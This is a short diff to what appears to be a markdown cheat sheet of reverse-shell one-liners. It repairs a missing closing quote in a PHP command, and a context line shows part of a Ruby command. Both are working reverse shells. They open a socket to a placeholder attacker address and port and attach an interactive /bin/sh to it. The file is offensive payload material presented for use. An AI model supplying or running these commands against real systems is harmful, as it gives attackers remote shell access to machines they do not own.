@@ -26,7 +26,7 @@ ruby -rsocket -e'f=TCPSocket.open("{IP-ADDRESS}",{PORT}).to_i;exec sprintf("/bin
 ### PHP
 
 ```php
-php -r '$sock=fsockopen("{IP-ADDRESS}",{PORT});exec("/bin/sh -i <&3 >&3 2>&3"); 
+php -r '$sock=fsockopen("{IP-ADDRESS}",{PORT});exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 
 ### Perl
